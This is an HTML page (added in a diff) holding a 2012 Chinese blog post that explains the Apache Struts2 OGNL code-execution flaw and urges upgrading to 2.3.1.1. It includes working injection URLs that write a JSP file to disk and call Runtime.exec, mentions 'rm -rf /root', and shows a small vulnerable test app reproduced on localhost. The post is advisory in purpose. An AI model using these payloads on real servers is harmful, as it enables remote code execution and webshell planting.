@@ -1,0 +1,833 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="http://cdn.zhaopeng.me/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  
+    <link href='//fonts.lug.ustc.edu.cn/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+  
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.4.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="stylesheet" type="text/css" href="http://cdn.zhaopeng.me/css/main.css?v=0.4.5.2"/>
+
+
+
+
+  <meta name="keywords" content="Hexo,next" />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="北冥大鸟" type="application/atom+xml" />
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.2" />
+
+
+<meta name="description" content="刚刚@乌云-漏洞报告平台公布的struts2代码执行漏洞，具体的漏洞说明地址
+https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt
+还是热乎的，我大概白话一下。
+这个漏洞的级别很高，都升级修补一下。
+影响版本是2.3.1和2.3.1之前的版本
+解决办法是升级">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2代码执行漏洞">
+<meta property="og:url" content="http://zhaopeng.me/2012/1/9/struts2-dai-ma-zhi-xing-lou-dong/index.html">
+<meta property="og:site_name" content="北冥大鸟">
+<meta property="og:description" content="刚刚@乌云-漏洞报告平台公布的struts2代码执行漏洞，具体的漏洞说明地址
+https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt
+还是热乎的，我大概白话一下。
+这个漏洞的级别很高，都升级修补一下。
+影响版本是2.3.1和2.3.1之前的版本
+解决办法是升级">
+<meta property="og:image" content="http://m2.img.libdd.com/farm3/118/48E585B6FE66C51CE8D30FB4525F2D76_200_80.PNG">
+<meta property="og:updated_time" content="2015-11-27T04:53:56.247Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="struts2代码执行漏洞">
+<meta name="twitter:description" content="刚刚@乌云-漏洞报告平台公布的struts2代码执行漏洞，具体的漏洞说明地址
+https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt
+还是热乎的，我大概白话一下。
+这个漏洞的级别很高，都升级修补一下。
+影响版本是2.3.1和2.3.1之前的版本
+解决办法是升级">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post'
+  };
+</script>
+
+
+
+  <title> struts2代码执行漏洞 | 北冥大鸟 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">北冥大鸟</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">赵鹏的书院</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+      
+        <li class="menu-item menu-item-search">
+          <a href="#" class="st-search-show-outputs">
+            
+              <i class="menu-item-icon fa fa-search icon-next-search"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'KKy7kMLzqcedsP4uzFVg','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                struts2代码执行漏洞
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2012-01-09T14:02:19+08:00" content="2012-01-09">
+              2012-01-09
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index">
+                    <span itemprop="name">java</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2012/1/9/struts2-dai-ma-zhi-xing-lou-dong/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2012/1/9/struts2-dai-ma-zhi-xing-lou-dong/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p>刚刚<a href="http://weibo.com/wooyun2" target="_blank" rel="external">@乌云-漏洞报告平台</a>公布的struts2代码执行漏洞，具体的漏洞说明地址</p>
+<p><a href="https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt" title="https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt" target="_blank" rel="external">https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt</a></p>
+<p>还是热乎的，我大概白话一下。</p>
+<p>这个漏洞的级别很高，都升级修补一下。</p>
+<p>影响版本是2.3.1和2.3.1之前的版本</p>
+<p>解决办法是升级2.3.1.1</p>
+<p>漏洞原理（自己理解的）</p>
+<p>Struts2的核心是使用的WebWork，处理Action时通过ParametersInterceptor（参数过滤器）调用Action的getter/setter方法来处理http的参数，它将每个http参数声明为一个ONGL语句。</p>
+<p>例如</p>
+<p>处理请求配置这样</p>
+<p>&lt;action name=&quot;Test&quot; class=&quot;example.Test&quot;&gt;<br><br>&nbsp;&nbsp;&nbsp; &lt;result name=&quot;input&quot;&gt;test.jsp&lt;/result&gt;<br><br>&lt;/action&gt;</p>
+<p>通过ONGL就可以转换成</p>
+<p>/Test.action?id=’%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/wwwroot/sec-consult.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b’</p>
+<p>oh！god！系统权限就有了，想干什么，就可以干什么了。</p>
+<p>或者这样</p>
+<p>/Test.action?id=’%2b(%23_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@java.lang.Runtime@getRuntime().exec(‘calc’))%2b’</p>
+<p>想执行什么就可以执行什么了。比如 rm –rf /root..</p>
+<p>我根据说明做了一下测试</p>
+<p>jdk：1.6</p>
+<p>struts:2.2.1</p>
+<p>代码如下：</p>
+<p>struts.xml</p>
+<p><pre><span>   1:</span><span>&lt;?</span><span>xml</span><span>version</span><span>=&quot;1.0&quot;</span><span>encoding</span><span>=&quot;UTF-8&quot;</span> ?<span>&gt;</span></pre><br><br><br><br><pre><span>   2:</span><span>&lt;!</span><span>DOCTYPE</span><span>struts</span><span>PUBLIC</span></pre><br><br><br><br><pre><span>   3:</span><span>&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></pre><br><br><br><br><pre><span>   4:</span><span>&quot;<a href="http://struts.apache.org/dtds/struts-2.0.dtd&amp;quot" target="_blank" rel="external">http://struts.apache.org/dtds/struts-2.0.dtd&amp;quot</a>;</span><span>&gt;</span></pre><br><br><br><br><pre><span>   5:</span><span>&lt;</span><span>struts</span><span>&gt;</span></pre><br><br><br><br><pre><span>   6:</span><span>&lt;</span><span>package</span><span>name</span><span>=&quot;default&quot;</span><span>namespace</span><span>=&quot;/&quot;</span><span>extends</span><span>=&quot;struts-default&quot;</span><span>&gt;</span></pre><br><br><br><br><pre><span>   7:</span><span>&lt;</span><span>action</span><span>name</span><span>=&quot;test&quot;</span><span>class</span><span>=&quot;me.dapeng.action.Test&quot;</span><span>&gt;</span></pre><br><br><br><br><pre><span>   8:</span><span>&lt;</span><span>result</span><span>name</span><span>=&quot;input&quot;</span><span>&gt;</span>test.jsp<span>&lt;/</span><span>result</span><span>&gt;</span></pre><br><br><br><br><pre><span>   9:</span><span>&lt;/</span><span>action</span><span>&gt;</span></pre><br><br><br><br><pre><span>  10:</span><span>&lt;/</span><span>package</span><span>&gt;</span></pre><br><br><br><br><pre><span>  11:</span><span>&lt;/</span><span>struts</span><span>&gt;</span></pre><br><br><br><br><br><br></p>
+<p>Test.java</p>
+<p><br><br><br><br><br><pre><span>   1:</span><span>package</span> me.dapeng.action;</pre><br><br><br><br><pre><span>   2:</span>&nbsp; </pre><br><br><br><br><pre><span>   3:</span><span>import</span> com.opensymphony.xwork2.ActionSupport;</pre><br><br><br><br><pre><span>   4:</span>&nbsp; </pre><br><br><br><br><pre><span>   5:</span><span>/<em>*</em></span></pre><br><br><br><br><pre><span>   6:</span><span>  </span></pre><br><br><br><br><pre><span>   7:</span><span> <em> @ClassName:Test.java.java</em></span></pre><br><br><br><br><pre><span>   8:</span><span>  @ClassDescription:测试Struts2漏洞</span></pre><br><br><br><br><pre><span>   9:</span><span> <em> @Author:dapeng</em></span></pre><br><br><br><br><pre><span>  10:</span><span>  @CreatTime:2012-1-9 下午1:45:36</span></pre><br><br><br><br><pre><span>  11:</span><span> <em> </em></span></pre><br><br><br><br><pre><span>  12:</span><span> /</span></pre><br><br><br><br><pre><span>  13:</span><span>public</span><span>class</span> Test <span>extends</span> ActionSupport {</pre><br><br><br><br><pre><span>  14:</span><span>long</span> id;</pre><br><br><br><br><pre><span>  15:</span>&nbsp; </pre><br><br><br><br><pre><span>  16:</span>     @Override</pre><br><br><br><br><pre><span>  17:</span><span>public</span> String execute() <span>throws</span> Exception {</pre><br><br><br><br><pre><span>  18:</span>         System.out.println(<span>&quot;execute input&quot;</span>);</pre><br><br><br><br><pre><span>  19:</span><span>return</span><span>&quot;input&quot;</span>;</pre><br><br><br><br><pre><span>  20:</span>     }</pre><br><br><br><br><pre><span>  21:</span>&nbsp; </pre><br><br><br><br><pre><span>  22:</span><span>public</span><span>long</span> getId() {</pre><br><br><br><br><pre><span>  23:</span><span>return</span> id;</pre><br><br><br><br><pre><span>  24:</span>     }</pre><br><br><br><br><pre><span>  25:</span>&nbsp; </pre><br><br><br><br><pre><span>  26:</span><span>public</span><span>void</span> setId(<span>long</span> id) {</pre><br><br><br><br><pre><span>  27:</span><span>this</span>.id = id;</pre><br><br><br><br><pre><span>  28:</span>     }</pre><br><br><br><br><pre><span>  29:</span>&nbsp; </pre><br><br><br><br><pre><span>  30:</span> }</pre><br><br><br><br><br><br>test.jsp<br><br><br><br><br><br><pre><span>   1:</span> &lt;%@ page language=<span>&quot;java&quot;</span><span>import</span>=<span>&quot;java.util.*&quot;</span> pageEncoding=<span>&quot;ISO-8859-1&quot;</span>%&gt;</pre><br><br><br><br><pre><span>   2:</span> &lt;%@ taglib prefix=<span>&quot;s&quot;</span> uri=<span>&quot;/struts-tags&quot;</span>%&gt;</pre><br><br><br><br><pre><span>   3:</span> &lt;br&gt;</pre><br><br><br><br><pre><span>   4:</span> &lt;s:property value=<span>&quot;id&quot;</span> /&gt;</pre><br><br><br><br><br><br></p>
+<p>请求URL</p>
+<p><br></p>
+<p><a href="http://localhost:8080/test/test.action?id=&#039;%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;" target="_blank" rel="external">http://localhost:8080/test/test.action?id=’%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b’</a>).append(&quot;jsp+shell&quot;).close())%2b&#039; “<a href="http://localhost:8080/test/test.action?id=&#039;%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b&amp;#039" target="_blank" rel="external">http://localhost:8080/test/test.action?id=&#039;%2b(new+java.io.BufferedWriter(new+java.io.FileWriter(&quot;C:/create.jsp&quot;)).append(&quot;jsp+shell&quot;).close())%2b&amp;#039</a>;”)</p>
+<p><br></p>
+<p>结果：</p>
+<p><br></p>
+<p>通过URL产生了自定义的文件，如果你想执行什么脚本都可以了。</p>
+<p><br></p>
+<p><a href="http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes.jpg" target="_blank" rel="external"></a><a href="http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes_thumb.jpg" target="_blank" rel="external"><img src="http://m2.img.libdd.com/farm3/118/48E585B6FE66C51CE8D30FB4525F2D76_200_80.PNG" alt="http://images.dapeng.me/dapengme/2012/01/struts2_B205/struts2_holes_thumb.jpg"></a></p>
+<p><br></p>
+<p>我也值测试了其中一种情况，其他的漏洞测试就不做了，没升级到安全版本的，赶紧升级吧！最近的安全问题很多的，别等出了安全问题，再想办法，亡羊补牢，为时已晚已！</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2011/12/31/13-ge-dai-ma-zhu-shi-de-xiao-ji-qiao/" rel="next" title="13个代码注释的小技巧">
+                <i class="fa fa-chevron-left"></i> 13个代码注释的小技巧
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/2/2/mysql-wang-ji-root-mi-ma-hou-de-xiu-gai/" rel="prev" title="mysql忘记root密码后的修改">
+                mysql忘记root密码后的修改 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+		<! -- 添加捐赠图标 -->
+    <div class ="post-donate">
+      <div id="donate_board" class="donate_bar center" style="text-align: center;">
+        <a id="btn_donate" class="btn_donate" href="javascript:;" title="Donate 打赏"></a>
+        <h2>Enjoy it ? Donate me !  欣赏此文？求鼓励，求支持！</h2>
+        <br>
+      </div>  
+  
+    <!-- 支付宝打赏图案 -->
+      <div id="donate_guide" class="donate_bar center hidden" style="text-align: center;">
+          <a href="http://cdn.zhaopeng.me/alipay.JPG" title="支付宝打赏" class="fancybox" rel="article0"       style="float:left;margin-left:25%;margin-right:2px;">
+          <img src="http://cdn.zhaopeng.me/alipay.JPG" title="支付宝打赏" height="164px" width="164px">
+          </a> 
+      </div>
+
+    <!-- 微信打赏图案 -->
+      <div id="donate_guide" class="donate_bar center hidden" style="text-align: center;">
+          <a href="http://cdn.zhaopeng.me/wechatpay.JPG" title="微信打赏" class="fancybox" rel="article0"  >
+          <img src="http://cdn.zhaopeng.me/wechatpay.JPG" title="微信打赏" height="164px" width="164px">
+          </a> 
+      </div>
+  
+      <script type="text/javascript">
+        document.getElementById('btn_donate').onclick = function(){
+          $('#donate_board').addClass('hidden');
+          $('#donate_guide').removeClass('hidden');
+        }
+      </script>
+    </div>
+<! -- 添加捐赠图标 -->
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="2012/1/9/struts2-dai-ma-zhi-xing-lou-dong/"
+                   data-title="struts2代码执行漏洞" data-url="http://zhaopeng.me/2012/1/9/struts2-dai-ma-zhi-xing-lou-dong/">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="赵鹏" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">赵鹏</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description"></p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">766</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">8</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">49</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/zhaopengme" target="_blank">
+                  <i class="fa fa-github"></i> github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/joypen" target="_blank">
+                  <i class="fa fa-weibo"></i> weibo
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.cobmw.com/" target="_blank">记忆碎片</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.itoldme.net/" target="_blank">墙外的梯子</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.versun.org/" target="_blank">versun</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.liangxin.name" target="_blank">心岛博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.imf7.com/" target="_blank">付琦的博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.itblog.me/" target="_blank">it技术博客</a>
+              </span>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+      
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy;  2008 - 
+  <span itemprop="copyrightYear">2015</span>
+  <span class="with-love">
+    <i class="icon-next-heart fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">赵鹏</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"zhaopengme"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+
+
+    
+  
+  
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/js/fancy-box.js?v=0.4.5.2"></script>
+
+
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/js/helpers.js?v=0.4.5.2"></script>
+  
+
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/js/motion_global.js?v=0.4.5.2" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/js/nav-toggle.js?v=0.4.5.2"></script>
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="http://cdn.zhaopeng.me/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        setTimeout(function(){
+          displaySidebar();
+        },2000);
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+
+      motionIntegrator.bootstrap();
+    });
+  </script>
+
+  
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="http://cdn.zhaopeng.me/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "http://cdn.zhaopeng.me/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
